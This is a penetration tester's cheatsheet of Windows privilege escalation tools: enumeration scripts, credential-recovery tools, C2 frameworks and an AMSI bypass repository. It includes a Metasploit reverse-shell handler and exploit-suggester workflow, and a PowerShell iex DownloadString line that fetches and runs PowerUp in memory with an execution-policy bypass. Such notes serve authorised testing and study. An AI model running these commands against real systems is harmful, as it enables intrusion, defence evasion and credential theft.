# Windows Privilege Escalation Scripts And Tools

Before tooling - consider the machine Situation that you must be aware of. It is always best to understand and map out the machine for yourself and assess in the grand scheme of what objective are, is it worth escalation on this machine - see [[Windows-Privilege-Escalation-Enumeration]] and corresponding  [[Windows-Privilege-Escalation-Vectors]].

Always compile tools from source if using them in a client environment.
- [JAWS](https://github.com/411Hall/JAWS) - *"Just Another Windows (Enum) Script"*
- [LaZagne](https://github.com/AlessandroZ/LaZagne) - *"Credentials recovery project"*
- [[PowerView-Cheatsheet]]
- [PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1) - [[PowerSploit-Helpsheet]] - *"PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."*
- [Seatbelt](https://github.com/GhostPack/Seatbelt) - *"Seatbelt is a C# project that performs a number of security oriented host-survey "safety checks" relevant from both offensive and defensive security perspectives."*
- [SessionGopher](https://github.com/Arvanaghi/SessionGopher) - *"is a PowerShell tool that uses WMI to extract saved session information for remote access tools such as WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally."*
- [SharpUp](https://github.com/GhostPack/SharpUp) - *"SharpUp is a C# port of various PowerUp functionality"*
- [Snaffer](https://github.com/SnaffCon/Snaffler) - finds readable files shares and uses ML-trained algorithm to display desirable files
- [Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) - See the [[Sysinternals]]
- [Watson](https://github.com/rasta-mouse/Watson) - *"Enumerate missing KBs and suggest exploits for useful Privilege Escalation vulnerabilities"*
- [Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng) - *"Windows Exploit Suggester - Next Generation"*
	- see [[WESNG-Helpsheet]] 
- [winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) - *"Windows local Privilege Escalation Awesome Script (C#.exe and .bat)"*
	- [All checks done are on HackTricks](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation) 

Post exploitation tools are integrated into C2s and are sometime actively maintained consider copying one from one - see [[C2-Matrix]] 

[[Metasploit]] modules:
```bash
msfconsole -> use multi/handler -> set payload - >set lhost -> run
# msfvenom your tailoured shell for targeting architecture professionalism
# copy shell to Windows box and run it
# On attack box
run post/multi/recon/local_exploit_suggester
# For example 
# identify exploit/windows/local/ms16_014_wmi_recv_notif
set session [sessionnumber]
set lport [portnumber]
run
```

Scripts and tools
```powershell
https://github.com/carlospolop/PEASS-ng # Is OSCP compliant as of 2022
https://github.com/Tib3rius/windowsprivchecker
https://github.com/gladiatx0r/Powerless.git # For OSCP & Legacy Windows System
https://github.com/411Hall/JAWS	# jaws-enum.ps1 -OutputFileName Jaws-Enum.txt
https://github.com/bitsadmin/nopowershell  
https://github.com/rasta-mouse/AmsiScanBufferBypass  
https://github.com/cobbr/InsecurePowerShell  
https://github.com/BC-SECURITY/Starkiller  
https://github.com/besimorhino/powercat
```
[subinacl](https://windows-resource-kit-tools-subinacl-exe.software.informer.com/) *"enables administrators to obtain security information about files, registry keys, and services, and transfer this information from user to user, from local or global group to group, and from domain to domain."* - Stealthy and reliable.
SysInternals will always be your friend - [[Sysinternals]] or [Download here](https://docs.microsoft.com/en-us/sysinternals/downloads/)
[[Impacket-Cheatsheet]]
[[Seatbelt-Helpsheet]]

[Empire](https://github.com/BC-SECURITY/Empire) is C2 covered here: [[Empire]] and [[Starkiller]]
For [wesng](https://github.com/bitsadmin/wesng) check usage for [[WESNG-Helpsheet]]
[Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection) is a GitHub repositories that contains ..*"
Nightly builds of common C# offensive tools, fresh from their respective master branches built and released in a CDI fashion using Azure DevOps release pipelines."* 
The below will load the PowerUp script into memory of a PowerShell shell, then use [[PowerSploit-Helpsheet]], from [PowerSploit](https://github.com/PowerShellMafia/PowerSploit)

```powershell
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1') 
powershell.exe -ExecutionPolicy Bypass -File .\
```

## References

[JAWS](https://github.com/411Hall/JAWS)
[LaZagne](https://github.com/AlessandroZ/LaZagne)
[PowerUp](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1)
[Seatbelt](https://github.com/GhostPack/Seatbelt)
[SessionGopher](https://github.com/Arvanaghi/SessionGopher)
[SharpUp](https://github.com/GhostPack/SharpUp)
[Snaffer](https://github.com/SnaffCon/Snaffler)
[Sysinternals Suite](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite) 
[Watson](https://github.com/rasta-mouse/Watson)
[Windows Exploit Suggester - Next Generation](https://github.com/bitsadmin/wesng)
[winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) 
[HackTricks](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
[subinacl](https://windows-resource-kit-tools-subinacl-exe.software.informer.com/) 
[Sysinternals Download here](https://docs.microsoft.com/en-us/sysinternals/downloads/)
[Empire](https://github.com/BC-SECURITY/Empire)
[wesng](https://github.com/bitsadmin/wesng)
[Flangvik/SharpCollection](https://github.com/Flangvik/SharpCollection) 
[PowerSploit](https://github.com/PowerShellMafia/PowerSploit)
